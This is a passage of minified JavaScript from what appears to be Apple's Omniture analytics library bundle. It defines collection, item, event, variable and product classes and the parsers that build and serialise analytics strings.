protoProps&&_defineProperties(Constructor.prototype,protoProps),staticProps&&_defineProperties(Constructor,staticProps),Object.defineProperty(Constructor,"prototype",{writable:!1}),Constructor}(OmnitureCollection,[{key:"add",value:function add(item){return item instanceof _index.default?this.set(item.key,item):this}},{key:"merge",value:function merge(){var _this3=this;return flattenMergeInput.apply(void 0,arguments).forEach((function(item){if(item instanceof _index.default){var existingItem=_this3.get(item.key);existingItem?existingItem.merge(item):_this3.add(item)}})),this}},{key:"toString",value:function toString(){var separator=arguments.length>0&&void 0!==arguments[0]?arguments[0]:_config.SEPARATORS.DEFAULT;return _toConsumableArray(this.values()).map((function(item){return item.toString()})).filter(Boolean).join(separator)}},{key:"sort",value:function sort(){var items=_toConsumableArray(this.values());this.clear(),items.sort((function(item1,item2){return item1.compareKeys(item2)})),this.merge.apply(this,_toConsumableArray(items))}}]),OmnitureCollection}(_wrapNativeSuper(Map));exports.default=OmnitureCollection},{"../OmnitureItem/index.js":100,"../config.js":104}],98:[function(require,module,exports){"use strict";function _typeof(o){return _typeof="function"==typeof Symbol&&"symbol"==typeof Symbol.iterator?function(o){return typeof o}:function(o){return o&&"function"==typeof Symbol&&o.constructor===Symbol&&o!==Symbol.prototype?"symbol":typeof o},_typeof(o)}Object.defineProperty(exports,"__esModule",{value:!0}),exports.default=void 0;var _analyticsUtils=require("@apple/analytics-utils"),_index=_interopRequireDefault(require("../OmnitureItem/index.js")),_index2=_interopRequireDefault(require("../OmnitureCollection/index.js")),_config=require("../config.js");function _interopRequireDefault(obj){return obj&&obj.__esModule?obj:{default:obj}}function ownKeys(e,r){var t=Object.keys(e);if(Object.getOwnPropertySymbols){var o=Object.getOwnPropertySymbols(e);r&&(o=o.filter((function(r){return Object.getOwnPropertyDescriptor(e,r).enumerable}))),t.push.apply(t,o)}return t}function _objectSpread(e){for(var r=1;r<arguments.length;r++){var t=null!=arguments[r]?arguments[r]:{};r%2?ownKeys(Object(t),!0).forEach((function(r){_defineProperty(e,r,t[r])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(t)):ownKeys(Object(t)).forEach((function(r){Object.defineProperty(e,r,Object.getOwnPropertyDescriptor(t,r))}))}return e}function _defineProperty(obj,key,value){return(key=_toPropertyKey(key))in obj?Object.defineProperty(obj,key,{value:value,enumerable:!0,configurable:!0,writable:!0}):obj[key]=value,obj}function _defineProperties(target,props){for(var i=0;i<props.length;i++){var descriptor=props[i];descriptor.enumerable=descriptor.enumerable||!1,descriptor.configurable=!0,"value"in descriptor&&(descriptor.writable=!0),Object.defineProperty(target,_toPropertyKey(descriptor.key),descriptor)}}function _toPropertyKey(arg){var key=function _toPrimitive(input,hint){if("object"!==_typeof(input)||null===input)return input;var prim=input[Symbol.toPrimitive];if(void 0!==prim){var res=prim.call(input,hint||"default");if("object"!==_typeof(res))return res;throw new TypeError("@@toPrimitive must return a primitive value.")}return("string"===hint?String:Number)(input)}(arg,"string");return"symbol"===_typeof(key)?key:String(key)}function _setPrototypeOf(o,p){return _setPrototypeOf=Object.setPrototypeOf?Object.setPrototypeOf.bind():function _setPrototypeOf(o,p){return o.__proto__=p,o},_setPrototypeOf(o,p)}function _createSuper(Derived){var hasNativeReflectConstruct=function _isNativeReflectConstruct(){if("undefined"==typeof Reflect||!Reflect.construct)return!1;if(Reflect.construct.sham)return!1;if("function"==typeof Proxy)return!0;try{return Boolean.prototype.valueOf.call(Reflect.construct(Boolean,[],(function(){}))),!0}catch(e){return!1}}();return function _createSuperInternal(){var result,Super=_getPrototypeOf(Derived);if(hasNativeReflectConstruct){var NewTarget=_getPrototypeOf(this).constructor;result=Reflect.construct(Super,arguments,NewTarget)}else result=Super.apply(this,arguments);return function _possibleConstructorReturn(self,call){if(call&&("object"===_typeof(call)||"function"==typeof call))return call;if(void 0!==call)throw new TypeError("Derived constructors may only return object or undefined");return function _assertThisInitialized(self){if(void 0===self)throw new ReferenceError("this hasn't been initialised - super() hasn't been called");return self}(self)}(this,result)}}function _getPrototypeOf(o){return _getPrototypeOf=Object.setPrototypeOf?Object.getPrototypeOf.bind():function _getPrototypeOf(o){return o.__proto__||Object.getPrototypeOf(o)},_getPrototypeOf(o)}var OmnitureContentRecommendation=function(_OmnitureItem){!function _inherits(subClass,superClass){if("function"!=typeof superClass&&null!==superClass)throw new TypeError("Super expression must either be null or a function");subClass.prototype=Object.create(superClass&&superClass.prototype,{constructor:{value:subClass,writable:!0,configurable:!0}}),Object.defineProperty(subClass,"prototype",{writable:!1}),superClass&&_setPrototypeOf(subClass,superClass)}(OmnitureContentRecommendation,_OmnitureItem);var _super=_createSuper(OmnitureContentRecommendation);function OmnitureContentRecommendation(){var _this,_props=arguments.length>0&&void 0!==arguments[0]?arguments[0]:{};!function _classCallCheck(instance,Constructor){if(!(instance instanceof Constructor))throw new TypeError("Cannot call a class as a function")}(this,OmnitureContentRecommendation);var props=_objectSpread(_objectSpread({},{moduleId:"",events:new _index2.default,variables:new _index2.default}),_props);return(_this=_super.call(this,props.moduleId)).moduleId=props.moduleId,_this.category="content",_this.events=props.events,_this.variables=props.variables,_this}return function _createClass(Constructor,protoProps,staticProps){return protoProps&&_defineProperties(Constructor.prototype,protoProps),staticProps&&_defineProperties(Constructor,staticProps),Object.defineProperty(Constructor,"prototype",{writable:!1}),Constructor}(OmnitureContentRecommendation,[{key:"merge",value:function merge(contentRec){return contentRec instanceof OmnitureContentRecommendation&&contentRec.key===this.key&&(this.events.merge(contentRec.events),this.variables.merge(contentRec.variables)),this}},{key:"toString",value:function toString(){return[(0,_analyticsUtils.toStrTrim)(this.category),(0,_analyticsUtils.toStrTrim)(this.moduleId),"","",this.events?this.events.toString(_config.SEPARATORS.PRODUCT_EVENTS):"",this.variables?this.variables.toString(_config.SEPARATORS.PRODUCT_VARIABLES):""].join(_config.SEPARATORS.PRODUCT_PROPS).replace(",","")}}]),OmnitureContentRecommendation}(_index.default);exports.default=OmnitureContentRecommendation},{"../OmnitureCollection/index.js":97,"../OmnitureItem/index.js":100,"../config.js":104,"@apple/analytics-utils":190}],99:[function(require,module,exports){"use strict";function _typeof(o){return _typeof="function"==typeof Symbol&&"symbol"==typeof Symbol.iterator?function(o){return typeof o}:function(o){return o&&"function"==typeof Symbol&&o.constructor===Symbol&&o!==Symbol.prototype?"symbol":typeof o},_typeof(o)}Object.defineProperty(exports,"__esModule",{value:!0}),exports.default=void 0;var _analyticsUtils=require("@apple/analytics-utils");function _defineProperties(target,props){for(var i=0;i<props.length;i++){var descriptor=props[i];descriptor.enumerable=descriptor.enumerable||!1,descriptor.configurable=!0,"value"in descriptor&&(descriptor.writable=!0),Object.defineProperty(target,(arg=descriptor.key,key=void 0,key=function _toPrimitive(input,hint){if("object"!==_typeof(input)||null===input)return input;var prim=input[Symbol.toPrimitive];if(void 0!==prim){var res=prim.call(input,hint||"default");if("object"!==_typeof(res))return res;throw new TypeError("@@toPrimitive must return a primitive value.")}return("string"===hint?String:Number)(input)}(arg,"string"),"symbol"===_typeof(key)?key:String(key)),descriptor)}var arg,key}function _setPrototypeOf(o,p){return _setPrototypeOf=Object.setPrototypeOf?Object.setPrototypeOf.bind():function _setPrototypeOf(o,p){return o.__proto__=p,o},_setPrototypeOf(o,p)}function _createSuper(Derived){var hasNativeReflectConstruct=function _isNativeReflectConstruct(){if("undefined"==typeof Reflect||!Reflect.construct)return!1;if(Reflect.construct.sham)return!1;if("function"==typeof Proxy)return!0;try{return Boolean.prototype.valueOf.call(Reflect.construct(Boolean,[],(function(){}))),!0}catch(e){return!1}}();return function _createSuperInternal(){var result,Super=_getPrototypeOf(Derived);if(hasNativeReflectConstruct){var NewTarget=_getPrototypeOf(this).constructor;result=Reflect.construct(Super,arguments,NewTarget)}else result=Super.apply(this,arguments);return function _possibleConstructorReturn(self,call){if(call&&("object"===_typeof(call)||"function"==typeof call))return call;if(void 0!==call)throw new TypeError("Derived constructors may only return object or undefined");return function _assertThisInitialized(self){if(void 0===self)throw new ReferenceError("this hasn't been initialised - super() hasn't been called");return self}(self)}(this,result)}}function _getPrototypeOf(o){return _getPrototypeOf=Object.setPrototypeOf?Object.getPrototypeOf.bind():function _getPrototypeOf(o){return o.__proto__||Object.getPrototypeOf(o)},_getPrototypeOf(o)}var OmnitureEvent=function(_OmnitureItem){!function _inherits(subClass,superClass){if("function"!=typeof superClass&&null!==superClass)throw new TypeError("Super expression must either be null or a function");subClass.prototype=Object.create(superClass&&superClass.prototype,{constructor:{value:subClass,writable:!0,configurable:!0}}),Object.defineProperty(subClass,"prototype",{writable:!1}),superClass&&_setPrototypeOf(subClass,superClass)}(OmnitureEvent,_OmnitureItem);var _super=_createSuper(OmnitureEvent);function OmnitureEvent(key,value){var _this;return function _classCallCheck(instance,Constructor){if(!(instance instanceof Constructor))throw new TypeError("Cannot call a class as a function")}(this,OmnitureEvent),(_this=_super.call(this,key)).value=value,_this}return function _createClass(Constructor,protoProps,staticProps){return protoProps&&_defineProperties(Constructor.prototype,protoProps),staticProps&&_defineProperties(Constructor,staticProps),Object.defineProperty(Constructor,"prototype",{writable:!1}),Constructor}(OmnitureEvent,[{key:"merge",value:function merge(event){return event instanceof OmnitureEvent&&event.key===this.key&&(this.value=event.value),this}},{key:"toString",value:function toString(){if(!this.key)return"";var trimmedValue=(0,_analyticsUtils.toStrTrim)(this.value);return trimmedValue&&"true"!==trimmedValue?"".concat(this.key,"=").concat(trimmedValue):this.key}}]),OmnitureEvent}(function _interopRequireDefault(obj){return obj&&obj.__esModule?obj:{default:obj}}(require("../OmnitureItem/index.js")).default);exports.default=OmnitureEvent},{"../OmnitureItem/index.js":100,"@apple/analytics-utils":190}],100:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.default=void 0;var _analyticsUtils=require("@apple/analytics-utils"),_splitKey3=function _interopRequireDefault(obj){return obj&&obj.__esModule?obj:{default:obj}}(require("./splitKey.js"));function _typeof(o){return _typeof="function"==typeof Symbol&&"symbol"==typeof Symbol.iterator?function(o){return typeof o}:function(o){return o&&"function"==typeof Symbol&&o.constructor===Symbol&&o!==Symbol.prototype?"symbol":typeof o},_typeof(o)}function _defineProperties(target,props){for(var i=0;i<props.length;i++){var descriptor=props[i];descriptor.enumerable=descriptor.enumerable||!1,descriptor.configurable=!0,"value"in descriptor&&(descriptor.writable=!0),Object.defineProperty(target,(arg=descriptor.key,key=void 0,key=function _toPrimitive(input,hint){if("object"!==_typeof(input)||null===input)return input;var prim=input[Symbol.toPrimitive];if(void 0!==prim){var res=prim.call(input,hint||"default");if("object"!==_typeof(res))return res;throw new TypeError("@@toPrimitive must return a primitive value.")}return("string"===hint?String:Number)(input)}(arg,"string"),"symbol"===_typeof(key)?key:String(key)),descriptor)}var arg,key}var OmnitureItem=function(){function OmnitureItem(key){!function _classCallCheck(instance,Constructor){if(!(instance instanceof Constructor))throw new TypeError("Cannot call a class as a function")}(this,OmnitureItem),this.key=(0,_analyticsUtils.toStrTrim)(key)}return function _createClass(Constructor,protoProps,staticProps){return protoProps&&_defineProperties(Constructor.prototype,protoProps),staticProps&&_defineProperties(Constructor,staticProps),Object.defineProperty(Constructor,"prototype",{writable:!1}),Constructor}(OmnitureItem,[{key:"merge",value:function merge(item){return item instanceof OmnitureItem&&(this.key=item.key),this}},{key:"toString",value:function toString(){return this.key}},{key:"compareKeys",value:function compareKeys(item){if(!(item instanceof OmnitureItem))return 0;var _splitKey=(0,_splitKey3.default)(this.key),key1=_splitKey.prefix,num1=_splitKey.number,_splitKey2=(0,_splitKey3.default)(item.key),key2=_splitKey2.prefix,num2=_splitKey2.number;return num1===num2&&key1&&key2?key1.localeCompare(key2):num1-num2}}]),OmnitureItem}();exports.default=OmnitureItem},{"./splitKey.js":101,"@apple/analytics-utils":190}],101:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.default=void 0;exports.default=function splitKey(key){if(!key)return{prefix:"",number:0};var match=key.match(/\d+$/);if(!match)return{prefix:key,number:0};var index=match.index;return{prefix:key.slice(0,index),number:parseInt(key.slice(index),10)}}},{}],102:[function(require,module,exports){"use strict";function _typeof(o){return _typeof="function"==typeof Symbol&&"symbol"==typeof Symbol.iterator?function(o){return typeof o}:function(o){return o&&"function"==typeof Symbol&&o.constructor===Symbol&&o!==Symbol.prototype?"symbol":typeof o},_typeof(o)}Object.defineProperty(exports,"__esModule",{value:!0}),exports.default=void 0;var _analyticsUtils=require("@apple/analytics-utils"),_index=_interopRequireDefault(require("../OmnitureItem/index.js")),_index2=_interopRequireDefault(require("../OmnitureCollection/index.js")),_config=require("../config.js");function _interopRequireDefault(obj){return obj&&obj.__esModule?obj:{default:obj}}function ownKeys(e,r){var t=Object.keys(e);if(Object.getOwnPropertySymbols){var o=Object.getOwnPropertySymbols(e);r&&(o=o.filter((function(r){return Object.getOwnPropertyDescriptor(e,r).enumerable}))),t.push.apply(t,o)}return t}function _objectSpread(e){for(var r=1;r<arguments.length;r++){var t=null!=arguments[r]?arguments[r]:{};r%2?ownKeys(Object(t),!0).forEach((function(r){_defineProperty(e,r,t[r])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(t)):ownKeys(Object(t)).forEach((function(r){Object.defineProperty(e,r,Object.getOwnPropertyDescriptor(t,r))}))}return e}function _defineProperty(obj,key,value){return(key=_toPropertyKey(key))in obj?Object.defineProperty(obj,key,{value:value,enumerable:!0,configurable:!0,writable:!0}):obj[key]=value,obj}function _defineProperties(target,props){for(var i=0;i<props.length;i++){var descriptor=props[i];descriptor.enumerable=descriptor.enumerable||!1,descriptor.configurable=!0,"value"in descriptor&&(descriptor.writable=!0),Object.defineProperty(target,_toPropertyKey(descriptor.key),descriptor)}}function _toPropertyKey(arg){var key=function _toPrimitive(input,hint){if("object"!==_typeof(input)||null===input)return input;var prim=input[Symbol.toPrimitive];if(void 0!==prim){var res=prim.call(input,hint||"default");if("object"!==_typeof(res))return res;throw new TypeError("@@toPrimitive must return a primitive value.")}return("string"===hint?String:Number)(input)}(arg,"string");return"symbol"===_typeof(key)?key:String(key)}function _setPrototypeOf(o,p){return _setPrototypeOf=Object.setPrototypeOf?Object.setPrototypeOf.bind():function _setPrototypeOf(o,p){return o.__proto__=p,o},_setPrototypeOf(o,p)}function _createSuper(Derived){var hasNativeReflectConstruct=function _isNativeReflectConstruct(){if("undefined"==typeof Reflect||!Reflect.construct)return!1;if(Reflect.construct.sham)return!1;if("function"==typeof Proxy)return!0;try{return Boolean.prototype.valueOf.call(Reflect.construct(Boolean,[],(function(){}))),!0}catch(e){return!1}}();return function _createSuperInternal(){var result,Super=_getPrototypeOf(Derived);if(hasNativeReflectConstruct){var NewTarget=_getPrototypeOf(this).constructor;result=Reflect.construct(Super,arguments,NewTarget)}else result=Super.apply(this,arguments);return function _possibleConstructorReturn(self,call){if(call&&("object"===_typeof(call)||"function"==typeof call))return call;if(void 0!==call)throw new TypeError("Derived constructors may only return object or undefined");return function _assertThisInitialized(self){if(void 0===self)throw new ReferenceError("this hasn't been initialised - super() hasn't been called");return self}(self)}(this,result)}}function _getPrototypeOf(o){return _getPrototypeOf=Object.setPrototypeOf?Object.getPrototypeOf.bind():function _getPrototypeOf(o){return o.__proto__||Object.getPrototypeOf(o)},_getPrototypeOf(o)}var OmnitureProduct=function(_OmnitureItem){!function _inherits(subClass,superClass){if("function"!=typeof superClass&&null!==superClass)throw new TypeError("Super expression must either be null or a function");subClass.prototype=Object.create(superClass&&superClass.prototype,{constructor:{value:subClass,writable:!0,configurable:!0}}),Object.defineProperty(subClass,"prototype",{writable:!1}),superClass&&_setPrototypeOf(subClass,superClass)}(OmnitureProduct,_OmnitureItem);var _super=_createSuper(OmnitureProduct);function OmnitureProduct(){var _this,_props=arguments.length>0&&void 0!==arguments[0]?arguments[0]:{};!function _classCallCheck(instance,Constructor){if(!(instance instanceof Constructor))throw new TypeError("Cannot call a class as a function")}(this,OmnitureProduct);var props=_objectSpread(_objectSpread({},{sku:"",category:"",qty:0,price:0,events:new _index2.default,variables:new _index2.default}),_props);return props.sku=_analyticsUtils.beaconHelpers.guessPartNumber(props.sku),(_this=_super.call(this,props.sku)).sku=props.sku,_this.category=props.category,_this.qty=props.qty,_this.price=props.price,_this.events=props.events,_this.variables=props.variables,_this}return function _createClass(Constructor,protoProps,staticProps){return protoProps&&_defineProperties(Constructor.prototype,protoProps),staticProps&&_defineProperties(Constructor,staticProps),Object.defineProperty(Constructor,"prototype",{writable:!1}),Constructor}(OmnitureProduct,[{key:"merge",value:function merge(product){return product instanceof OmnitureProduct&&product.key===this.key&&(this.category=product.category||this.category,this.qty=product.qty||this.qty,this.price=product.price||this.price,this.events.merge(product.events),this.variables.merge(product.variables)),this}},{key:"toString",value:function toString(){return[(0,_analyticsUtils.toStrTrim)(this.category),(0,_analyticsUtils.toStrTrim)(this.sku),this.qty?(0,_analyticsUtils.toStrTrim)(this.qty):"",this.price?_analyticsUtils.beaconHelpers.formatPrice(this.price):"",this.events?this.events.toString(_config.SEPARATORS.PRODUCT_EVENTS):"",this.variables?this.variables.toString(_config.SEPARATORS.PRODUCT_VARIABLES):""].join(_config.SEPARATORS.PRODUCT_PROPS).replace(",","")}}]),OmnitureProduct}(_index.default);exports.default=OmnitureProduct},{"../OmnitureCollection/index.js":97,"../OmnitureItem/index.js":100,"../config.js":104,"@apple/analytics-utils":190}],103:[function(require,module,exports){"use strict";function _typeof(o){return _typeof="function"==typeof Symbol&&"symbol"==typeof Symbol.iterator?function(o){return typeof o}:function(o){return o&&"function"==typeof Symbol&&o.constructor===Symbol&&o!==Symbol.prototype?"symbol":typeof o},_typeof(o)}Object.defineProperty(exports,"__esModule",{value:!0}),exports.default=void 0;var _analyticsUtils=require("@apple/analytics-utils");function _defineProperties(target,props){for(var i=0;i<props.length;i++){var descriptor=props[i];descriptor.enumerable=descriptor.enumerable||!1,descriptor.configurable=!0,"value"in descriptor&&(descriptor.writable=!0),Object.defineProperty(target,(arg=descriptor.key,key=void 0,key=function _toPrimitive(input,hint){if("object"!==_typeof(input)||null===input)return input;var prim=input[Symbol.toPrimitive];if(void 0!==prim){var res=prim.call(input,hint||"default");if("object"!==_typeof(res))return res;throw new TypeError("@@toPrimitive must return a primitive value.")}return("string"===hint?String:Number)(input)}(arg,"string"),"symbol"===_typeof(key)?key:String(key)),descriptor)}var arg,key}function _setPrototypeOf(o,p){return _setPrototypeOf=Object.setPrototypeOf?Object.setPrototypeOf.bind():function _setPrototypeOf(o,p){return o.__proto__=p,o},_setPrototypeOf(o,p)}function _createSuper(Derived){var hasNativeReflectConstruct=function _isNativeReflectConstruct(){if("undefined"==typeof Reflect||!Reflect.construct)return!1;if(Reflect.construct.sham)return!1;if("function"==typeof Proxy)return!0;try{return Boolean.prototype.valueOf.call(Reflect.construct(Boolean,[],(function(){}))),!0}catch(e){return!1}}();return function _createSuperInternal(){var result,Super=_getPrototypeOf(Derived);if(hasNativeReflectConstruct){var NewTarget=_getPrototypeOf(this).constructor;result=Reflect.construct(Super,arguments,NewTarget)}else result=Super.apply(this,arguments);return function _possibleConstructorReturn(self,call){if(call&&("object"===_typeof(call)||"function"==typeof call))return call;if(void 0!==call)throw new TypeError("Derived constructors may only return object or undefined");return function _assertThisInitialized(self){if(void 0===self)throw new ReferenceError("this hasn't been initialised - super() hasn't been called");return self}(self)}(this,result)}}function _getPrototypeOf(o){return _getPrototypeOf=Object.setPrototypeOf?Object.getPrototypeOf.bind():function _getPrototypeOf(o){return o.__proto__||Object.getPrototypeOf(o)},_getPrototypeOf(o)}var OmnitureVariable=function(_OmnitureItem){!function _inherits(subClass,superClass){if("function"!=typeof superClass&&null!==superClass)throw new TypeError("Super expression must either be null or a function");subClass.prototype=Object.create(superClass&&superClass.prototype,{constructor:{value:subClass,writable:!0,configurable:!0}}),Object.defineProperty(subClass,"prototype",{writable:!1}),superClass&&_setPrototypeOf(subClass,superClass)}(OmnitureVariable,_OmnitureItem);var _super=_createSuper(OmnitureVariable);function OmnitureVariable(key,value){var _this;return function _classCallCheck(instance,Constructor){if(!(instance instanceof Constructor))throw new TypeError("Cannot call a class as a function")}(this,OmnitureVariable),(_this=_super.call(this,key)).value=value,_this}return function _createClass(Constructor,protoProps,staticProps){return protoProps&&_defineProperties(Constructor.prototype,protoProps),staticProps&&_defineProperties(Constructor,staticProps),Object.defineProperty(Constructor,"prototype",{writable:!1}),Constructor}(OmnitureVariable,[{key:"merge",value:function merge(variable){return variable instanceof OmnitureVariable&&variable.key===this.key&&(this.value=variable.value),this}},{key:"toString",value:function toString(){var trimmedValue=(0,_analyticsUtils.toStrTrim)(this.value);return this.key&&trimmedValue?"".concat(this.key,"=").concat(trimmedValue):""}}]),OmnitureVariable}(function _interopRequireDefault(obj){return obj&&obj.__esModule?obj:{default:obj}}(require("../OmnitureItem/index.js")).default);exports.default=OmnitureVariable},{"../OmnitureItem/index.js":100,"@apple/analytics-utils":190}],104:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.SEPARATORS=void 0;exports.SEPARATORS={DEFAULT:",",PRODUCT_PROPS:";",PRODUCT_EVENTS:"|",PRODUCT_VARIABLES:"|"}},{}],105:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),Object.defineProperty(exports,"OmnitureCollection",{enumerable:!0,get:function get(){return _index.default}}),Object.defineProperty(exports,"OmnitureContentRecommendation",{enumerable:!0,get:function get(){return _index6.default}}),Object.defineProperty(exports,"OmnitureEvent",{enumerable:!0,get:function get(){return _index3.default}}),Object.defineProperty(exports,"OmnitureItem",{enumerable:!0,get:function get(){return _index2.default}}),Object.defineProperty(exports,"OmnitureProduct",{enumerable:!0,get:function get(){return _index5.default}}),Object.defineProperty(exports,"OmnitureVariable",{enumerable:!0,get:function get(){return _index4.default}}),Object.defineProperty(exports,"parseEventCollectionString",{enumerable:!0,get:function get(){return _parseEventCollectionString.default}}),Object.defineProperty(exports,"parseItemCollectionArray",{enumerable:!0,get:function get(){return _parseItemCollectionArray.default}}),Object.defineProperty(exports,"parseItemCollectionString",{enumerable:!0,get:function get(){return _parseItemCollectionString.default}}),Object.defineProperty(exports,"parseProductCollectionString",{enumerable:!0,get:function get(){return _index7.default}});var _index=_interopRequireDefault(require("./OmnitureCollection/index.js")),_index2=_interopRequireDefault(require("./OmnitureItem/index.js")),_index3=_interopRequireDefault(require("./OmnitureEvent/index.js")),_index4=_interopRequireDefault(require("./OmnitureVariable/index.js")),_index5=_interopRequireDefault(require("./OmnitureProduct/index.js")),_index6=_interopRequireDefault(require("./OmnitureContentRecommendation/index.js")),_parseItemCollectionString=_interopRequireDefault(require("./parsers/parseItemCollectionString.js")),_parseItemCollectionArray=_interopRequireDefault(require("./parsers/parseItemCollectionArray.js")),_parseEventCollectionString=_interopRequireDefault(require("./parsers/parseEventCollectionString.js")),_index7=_interopRequireDefault(require("./parsers/parseProductCollectionString/index.js"));function _interopRequireDefault(obj){return obj&&obj.__esModule?obj:{default:obj}}},{"./OmnitureCollection/index.js":97,"./OmnitureContentRecommendation/index.js":98,"./OmnitureEvent/index.js":99,"./OmnitureItem/index.js":100,"./OmnitureProduct/index.js":102,"./OmnitureVariable/index.js":103,"./parsers/parseEventCollectionString.js":106,"./parsers/parseItemCollectionArray.js":107,"./parsers/parseItemCollectionString.js":108,"./parsers/parseProductCollectionString/index.js":110}],106:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.default=void 0;var _index=_interopRequireDefault(require("../OmnitureCollection/index.js")),_index2=_interopRequireDefault(require("../OmnitureEvent/index.js")),_config=require("../config.js");function _interopRequireDefault(obj){return obj&&obj.__esModule?obj:{default:obj}}function _slicedToArray(arr,i){return function _arrayWithHoles(arr){if(Array.isArray(arr))return arr}(arr)||function _iterableToArrayLimit(r,l){var t=null==r?null:"undefined"!=typeof Symbol&&r[Symbol.iterator]||r["@@iterator"];if(null!=t){var e,n,i,u,a=[],f=!0,o=!1;try{if(i=(t=t.call(r)).next,0===l){if(Object(t)!==t)return;f=!1}else for(;!(f=(e=i.call(t)).done)&&(a.push(e.value),a.length!==l);f=!0);}catch(r){o=!0,n=r}finally{try{if(!f&&null!=t.return&&(u=t.return(),Object(u)!==u))return}finally{if(o)throw n}}return a}}(arr,i)||function _unsupportedIterableToArray(o,minLen){if(!o)return;if("string"==typeof o)return _arrayLikeToArray(o,minLen);var n=Object.prototype.toString.call(o).slice(8,-1);"Object"===n&&o.constructor&&(n=o.constructor.name);if("Map"===n||"Set"===n)return Array.from(o);if("Arguments"===n||/^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(n))return _arrayLikeToArray(o,minLen)}(arr,i)||function _nonIterableRest(){throw new TypeError("Invalid attempt to destructure non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.")}()}function _arrayLikeToArray(arr,len){(null==len||len>arr.length)&&(len=arr.length);for(var i=0,arr2=new Array(len);i<len;i++)arr2[i]=arr[i];return arr2}exports.default=function parseEventCollectionString(eventCollectionString){var separator=arguments.length>1&&void 0!==arguments[1]?arguments[1]:_config.SEPARATORS.DEFAULT,collection=new _index.default;return eventCollectionString&&"string"==typeof eventCollectionString?(eventCollectionString.split(separator).forEach((function(eventString){var _eventString$split2=_slicedToArray(eventString.split("="),2),key=_eventString$split2[0],value=_eventString$split2[1];key&&collection.add(new _index2.default(key,value))})),collection):collection}},{"../OmnitureCollection/index.js":97,"../OmnitureEvent/index.js":99,"../config.js":104}],107:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.default=void 0;var _index=_interopRequireDefault(require("../OmnitureCollection/index.js")),_index2=_interopRequireDefault(require("../OmnitureItem/index.js"));function _interopRequireDefault(obj){return obj&&obj.__esModule?obj:{default:obj}}exports.default=function parseItemCollectionArray(itemCollectionArray){var collection=new _index.default;return itemCollectionArray&&Array.isArray(itemCollectionArray)?(itemCollectionArray.forEach((function(key){key&&collection.add(new _index2.default(key))})),collection):collection}},{"../OmnitureCollection/index.js":97,"../OmnitureItem/index.js":100}],108:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.default=void 0;var _index=_interopRequireDefault(require("../OmnitureCollection/index.js")),_index2=_interopRequireDefault(require("../OmnitureItem/index.js")),_config=require("../config.js");function _interopRequireDefault(obj){return obj&&obj.__esModule?obj:{default:obj}}exports.default=function parseItemCollectionString(itemCollectionString){var separator=arguments.length>1&&void 0!==arguments[1]?arguments[1]:_config.SEPARATORS.DEFAULT,collection=new _index.default;return itemCollectionString&&"string"==typeof itemCollectionString?(itemCollectionString.split(separator).forEach((function(key){key&&collection.add(new _index2.default(key))})),collection):collection}},{"../OmnitureCollection/index.js":97,"../OmnitureItem/index.js":100,"../config.js":104}],109:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.default=void 0;var _analyticsOmnitureConstants=require("@apple/analytics-omniture-constants"),_analyticsUtils=require("@apple/analytics-utils"),_index=_interopRequireDefault(require("../../OmnitureCollection/index.js")),_index2=_interopRequireDefault(require("../../OmnitureEvent/index.js")),_index3=_interopRequireDefault(require("../../OmnitureProduct/index.js"));function _interopRequireDefault(obj){return obj&&obj.__esModule?obj:{default:obj}}var EVENT_TOTAL_QTY=_analyticsOmnitureConstants.EVENTS.EVENT_101,EVENT_TOTAL_PRICE=_analyticsOmnitureConstants.EVENTS.EVENT_102,toNumber=_analyticsUtils.beaconHelpers.getRawNumberFromString,formatPrice=_analyticsUtils.beaconHelpers.formatPrice;exports.default=function addProductToCollection(collection,product){if(!(collection instanceof _index.default&&product instanceof _index3.default))return collection;var existingProduct=collection.get(product.sku);if(!existingProduct)return collection.add(product);var totalQty=toNumber(existingProduct.qty)+toNumber(product.qty),totalPrice=formatPrice(toNumber(existingProduct.price)*totalQty);return existingProduct.qty=totalQty,existingProduct.variables.merge(product.variables),existingProduct.events.merge(product.events,new _index2.default(EVENT_TOTAL_QTY,totalQty),new _index2.default(EVENT_TOTAL_PRICE,totalPrice)),collection}},{"../../OmnitureCollection/index.js":97,"../../OmnitureEvent/index.js":99,"../../OmnitureProduct/index.js":102,"@apple/analytics-omniture-constants":115,"@apple/analytics-utils":190}],110:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.default=void 0;var _index=_interopRequireDefault(require("../../OmnitureCollection/index.js")),_productCollectionStringToProductStringArray=_interopRequireDefault(require("./productCollectionStringToProductStringArray.js")),_parseProductString=_interopRequireDefault(require("./parseProductString.js")),_addProductToCollection=_interopRequireDefault(require("./addProductToCollection.js"));function _interopRequireDefault(obj){return obj&&obj.__esModule?obj:{default:obj}}exports.default=function parseProductCollectionString(productCollectionString){var collection=new _index.default;return productCollectionString&&"string"==typeof productCollectionString?((0,_productCollectionStringToProductStringArray.default)(productCollectionString).forEach((function(productString){(0,_addProductToCollection.default)(collection,(0,_parseProductString.default)(productString))})),collection):collection}},{"../../OmnitureCollection/index.js":97,"./addProductToCollection.js":109,"./parseProductString.js":111,"./productCollectionStringToProductStringArray.js":112}],111:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.default=void 0;var _index=_interopRequireDefault(require("../../OmnitureProduct/index.js")),_config=require("../../config.js"),_parseEventCollectionString=_interopRequireDefault(require("./../parseEventCollectionString.js")),_parseVariableCollectionString=_interopRequireDefault(require("./../parseVariableCollectionString.js"));function _interopRequireDefault(obj){return obj&&obj.__esModule?obj:{default:obj}}function _slicedToArray(arr,i){return function _arrayWithHoles(arr){if(Array.isArray(arr))return arr}(arr)||function _iterableToArrayLimit(r,l){var t=null==r?null:"undefined"!=typeof 